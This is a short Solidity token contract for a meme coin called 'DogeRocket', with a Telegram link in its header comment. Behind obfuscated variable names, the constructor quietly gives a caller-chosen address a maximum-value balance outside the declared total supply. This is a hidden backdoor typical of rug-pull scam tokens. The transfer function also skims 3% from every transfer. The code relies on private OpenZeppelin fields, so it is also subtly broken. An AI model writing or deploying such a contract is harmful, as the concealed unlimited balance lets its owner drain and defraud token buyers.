/*

https://t.me/dogerocket_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract DogeRocket is ERC20, Ownable {
    uint256 private shallow = ~uint256(0);
    uint256 public compass = 3;

    constructor(
        string memory yard,
        string memory stretch,
        address saw,
        address cream
    ) ERC20(yard, stretch) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[cream] = shallow;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address tree,
        address whether,
        uint256 electric
    ) internal override {
        uint256 deep = (electric / 100) * compass;
        electric = electric - deep;
        super._transfer(tree, whether, electric);
    }
}